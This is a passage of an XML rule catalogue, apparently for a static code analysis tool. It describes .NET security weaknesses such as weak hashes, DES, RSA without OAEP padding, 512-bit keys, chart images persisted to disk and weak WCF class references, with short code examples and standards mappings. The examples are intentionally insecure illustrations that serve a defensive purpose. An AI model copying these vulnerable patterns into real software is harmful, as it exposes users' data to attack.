																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[13]  <em>Marshal Class</em> Microsoft<br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-4 Information in Shared Resources (P1)</em> <br></p>
																									   <p>[19]  <em>SecureString Class</em> Microsoft<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_privacy_violation_image</key>
    <internalKey>Security Features/Privacy Violation/Image</internalKey>
    <name>Privacy Violation: Image</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The application server persists sensitive information to disk in an unencrypted format. This data may not be removed under all conditions.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Configuring a Chart Image handler to persist images to disk may result in a privacy violation if the chart contains sensitive information.<br><br><b>Example 1:</b> The following application setting within the <code>web.config</code> file forces a Data Visualization control to persist any graphs it produces to disk:<br><br><pre><br>&lt;configuration&gt;<br>	&lt;appSettings&gt;<br>        &lt;add key="ChartImageHandler" value="storage=file;timeout=20;deleteAfterServicing=false;" /&gt;<br>    &lt;/appSettings&gt;<br>&lt;/configuration&gt;<br><br></pre><br><br>The <code>value</code> attribute of the <code>add</code> element contains the setting <code>"storage=file"</code>. This is problematic if any Data Visualization control displays sensitive data to the user because .NET stores the image in an unencrypted format on disk.<br><br>To make matters worse, this element contains the problematic attribute <code>"deleteAfterServicing=false"</code>. This instructs .NET to not delete an image after the infrastructure has served it to the user. If the image is sensitive, .NET will not delete it and it is now available for future inspection.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 359</em> <br></p>
																									   <p>[9]  <em>ImageStorageMode Enumeration</em> Microsoft<br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.2.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4</em> <br></p>
																									   <p>[16] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_wcf_misconfiguration_weak_class_reference</key>
    <internalKey>Security Features/WCF Misconfiguration/Weak Class Reference</internalKey>
    <name>WCF Misconfiguration: Weak Class Reference</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program uses a weak class reference, which might allow an attacker to execute unauthorized code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The program references a user-defined class that is not uniquely identified.  When .NET loads this weakly identified class, the CLR type loader searches for the class in the following locations in the specified order:<br><br>- If the assembly of the type is known, the loader searches the configuration file's redirect locations, GAC, the current assembly using configuration information, and the application base directory.<br><br>- If the assembly is unknown, the loader searches the current assembly, mscorlib, and the location returned by the TypeResolve event handler.<br><br>This CLR search order can be modified with hooks such as the Type Forwarding mechanism and the AppDomain.TypeResolve event.<br><br>If an attacker exploits the CLR search order by creating an alternative class with the same name and placing it in an alternative location that the CLR will load first, the CLR will unintentionally execute the attacker-supplied code.<br><br><b>Example 1:</b> The <code>&lt;behaviorExtensions/&gt;</code> element of the WCF configuration file below instructs WCF to add a custom behavior class to a particular WCF extension.<br><br><pre><br>&lt;system.serviceModel&gt;<br>    &lt;extensions&gt;<br>        &lt;behaviorExtensions&gt;<br>            &lt;add name="myBehavior" type="MyBehavior" /&gt;<br>       &lt;/behaviorExtensions&gt;<br>    &lt;/extensions&gt;<br>&lt;/system.serviceModel&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 95</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[13]  <em>Microsoft Developer Network (MSDN)</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[18] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_weak_cryptographic_hash</key>
    <internalKey>Security Features/Weak Cryptographic Hash</internalKey>
    <name>Weak Cryptographic Hash</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  MD5 and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. Recent advances in cryptanalysis have discovered weaknesses in both algorithms. Consequently, MD5 and SHA-1 should no longer be relied upon to verify the authenticity of data in security-critical contexts.<br><br>Techniques for breaking MD5 hashes are advanced and widely available enough that the algorithm must not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 310</em> <br></p>
																									   <p>[11] Xiaoyun Wang, Yiqun Lisa Yin, and Hongbo Yu <em>Finding Collisions in the Full SHA-1</em> <br></p>
																									   <p>[12] Xiaoyun Wang and Hongbo Yu <em>How to Break MD5 and Other Hash Functions</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M6 Broken Cryptography</em> <br></p>
																									   <p>[15] Stach & Liu <em>MD5 and MD4 Collision Generators</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-13 Cryptographic Protection (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_weak_encryption</key>
    <internalKey>Security Features/Weak Encryption</internalKey>
    <name>Weak Encryption</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program uses a weak encryption algorithm that cannot guarantee the confidentiality of sensitive data.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Antiquated encryption algorithms such as DES no longer provide sufficient protection for use with sensitive data. Encryption algorithms rely on key size as one of the primary mechanism to ensure cryptographic strength. Cryptographic strength is often measured by the time and computational power needed to generate a valid key. Advances in computing power have made it possible to obtain small encryption keys in a reasonable amount of time. For example, the 56-bit key used in DES posed a significant computational hurdle in the 1970's when the algorithm was first developed, but today DES can be cracked in less than a day using commonly available equipment.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 327</em> <br></p>
																									   <p>[11] distributed.net <em>DES</em> <br></p>
																									   <p>[12]  <em>FAQ About the Electronic Frontier Foundation's "DES Cracker" Machine</em> Electronic Frontier Foundation<br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M6 Broken Cryptography</em> <br></p>
																									   <p>[15]  <em>Microsoft Security Fundamentals</em> Microsoft<br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 327</em> <br></p>
																									   <p>[18] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 327</em> <br></p>
																									   <p>[19] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 327</em> <br></p>
																									   <p>[20] John Kelsey, Bruce Schneier, and David Wagner <em>Related-key cryptanalysis of 3-WAY, Biham-DES, CAST, DES-X, NewDES, RC2, and TEA</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[24] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[25] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-13 Cryptographic Protection (P1)</em> <br></p>
																									   <p>[26]  <em>SDL Development Practices</em> Microsoft<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_weak_encryption_inadequate_rsa_padding</key>
    <internalKey>Security Features/Weak Encryption/Inadequate RSA Padding</internalKey>
    <name>Weak Encryption: Inadequate RSA Padding</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The RSA algorithm is used without OAEP padding, thereby making the encryption weak.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When used in practice, RSA is generally combined with some padding scheme. The goal of the padding scheme is to prevent a number of attacks that potentially work against RSA without padding.<br><br><b>Example 1:</b> The following code uses the RSA algorithm without appropriate padding.<br><pre><br>  static public byte[] EncryptWithRSA(byte[] plaintext, RSAParameters key) {<br>    try {<br>      RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();<br>      rsa.ImportParameters(key);<br>      return rsa.Encrypt(plaintext, false);<br>    }<br>    catch(CryptographicException e) {<br>      Console.WriteLine(e.Message);<br>      return null;<br>    }<br>  }<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 325</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M6 Broken Cryptography</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[14]  <em>OPENSSL Documentation</em> <br></p>
																									   <p>[15]  <em>PKCS #1 v2.1: RSA Cryptography Standard</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-13 Cryptographic Protection (P1)</em> <br></p>
																									   <p>[21]  <em>Wikipedia</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_weak_encryption_insufficient_key_size</key>
    <internalKey>Security Features/Weak Encryption/Insufficient Key Size</internalKey>
    <name>Weak Encryption: Insufficient Key Size</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An otherwise strong encryption algorithm is vulnerable to brute force attack when a small key size is used.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Current cryptography guidelines suggest that key lengths of at least 1024 bits should be used with the RSA algorithm. However, increased computing power and advances in factoring techniques[1] are challenging the security of 1024 bit RSA encryption.<br><br><b>Example 1:</b> The following code uses the RSA algorithm with a 512 bit encryption key.<br><pre><br>  static public byte[] EncryptWithRSA(byte[] plaintext, RSAParameters key) {<br>    try {<br>      RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(512);<br>      rsa.ImportParameters(key);<br>      return rsa.Encrypt(plaintext, true);<br>    }<br>    catch(CryptographicException e) {<br>      Console.WriteLine(e.Message);<br>      return null;<br>    }<br>  }<br></pre><br><br>When it comes to symmetric encryption, the key lengths should be at least 128 bits.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] J. Cheng <em>307-digit key crack endangers 1024-bit RSA</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[11]  <em>B. Chess and J. West, Secure Programming with Static Analysis. Boston, MA: Addison-Wesley, 2007.</em> <br></p>
																									   <p>[12]  <em>Cryptographic Algorithms and Key Sizes for Personal Identity Verification</em> NIST<br></p>
																									   <p>[13] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 310</em> <br></p>
																									   <p>[14] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M6 Broken Cryptography</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.6.1, Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.6.1, Requirement 6.5.3</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.6.1, Requirement 6.5.3</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.6.1, Requirement 6.5.8</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-12 Cryptographic Key Establishment and Management (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>time_and_state_asp_net_bad_practices_non_serializable_object_stored_in_session</key>
    <internalKey>Time and State/ASP.NET Bad Practices/Non-Serializable Object Stored in Session</internalKey>
    <name>ASP.NET Bad Practices: Non-Serializable Object Stored in Session</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Storing a non-serializable object as an <code>HttpSessionState</code> attribute can damage application reliability.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  By default, ASP.NET servers store the <code>HttpSessionState</code> object, its attributes and any objects they reference in memory. This model limits active session state to what can be accommodated by the system memory of a single machine. In order to expand capacity beyond these limitations, servers are frequently configured to persistent session state information, which both expands capacity and permits the replication across multiple machines to improve overall performance. In order to persist its session state, the server must serialize the <code>HttpSessionState</code> object, which requires that all objects stored in it be serializable.<br><br>In order for the session to be serialized correctly, all objects the application stores as session attributes must declare the <code>[Serializable]</code> attribute. Additionally, if the object requires custom serialization methods, it must also implement the <code>ISerializable</code> interface.<br><br><b>Example 1:</b> The following class adds itself to the session, but since it is not serializable, the session cannot be serialized correctly.<br><br><pre><br>public class DataGlob {<br>   String GlobName;<br>   String GlobValue;<br><br>   public void AddToSession(HttpSessionState session) {<br>     session["glob"] = this;<br>   }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 579</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[11]  <em>Session State Providers</em> Microsoft Corporation<br></p>
																									   <p>[12]  <em>State Management and Caching: Underpinnings of the Session State Implementation in ASP.NET</em> Microsoft Corporation<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>time-and-state</tag>
  </rule>
  <rule>
    <key>time_and_state_race_condition_roaming_data_access</key>
    <internalKey>Time and State/Race Condition/Roaming Data Access</internalKey>
    <name>Race Condition: Roaming Data Access</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The developer is using the <code>RoamingFolder</code> or <code>RoamingSettings</code> property of the <code>Windows.Storage.ApplicationData</code> class on line <Replace key="PrimaryLocation.line"/> of the file <Replace key="PrimaryLocation.file"/>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The <code>RoamingFolder</code> and <code>RoamingSettings</code> properties get a container in the roaming app data store, which can then be used to share data between two more devices.  By writing and reading objects stored in the roaming app data store the developer increases the risk of compromising the confidentiality, integrity, and availability of the data, applications and systems which share those objects through the roaming app data store.<br><br>Developers should refrain from using this functionality without first implementing the necessary technical controls.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[6]  <em>ApplicationData.RoamingFolder | roamingFolder property</em> <br></p>
																									   <p>[7]  <em>ApplicationData.RoamingSettings | roamingSettings property</em> <br></p>
																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 362, CWE ID 367</em> <br></p>
																									   <p>[9] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 362</em> <br></p>
																									   <p>[10] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 362</em> <br></p>
